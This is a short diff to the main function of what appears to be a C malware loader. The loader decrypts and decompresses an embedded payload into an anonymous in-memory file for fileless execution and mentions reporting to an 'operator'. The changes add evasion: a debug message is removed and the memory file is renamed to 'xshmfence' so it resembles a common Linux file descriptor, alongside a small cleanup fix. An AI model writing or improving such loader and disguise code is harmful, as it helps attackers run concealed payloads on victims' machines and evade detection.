@@ -50,14 +50,13 @@ int main(int argc, char **argv)
         decrypted = (void *)decrypt((unsigned char *)payloadOffset, metaBytes[i].encryptedLength, metaBytes[i].decryptedLength);
         if (decrypted == NULL)
         {
-            puts("Bad decrypt");
             free(decrypted);
             return -1;
         }
 
         decompressed = (void *)decompress((unsigned char *)decrypted, (uLong)metaBytes[i].uncompressedLength, (uLong)metaBytes[i].decryptedLength);
 
-        while ((payloadFD = memfd_create("temp", 0)) <= 2)
+        while ((payloadFD = memfd_create("xshmfence", 0)) <= 2) // name as such due to this fd name appearing often on linux
         { // create memory file descriptor for execution
             close(payloadFD);
             return -1;
@@ -79,6 +78,7 @@ int main(int argc, char **argv)
                 {
                     //send message to operator
                     free(decompressed);
+                    close(payloadFD);
                     return -1;
                 }
             }
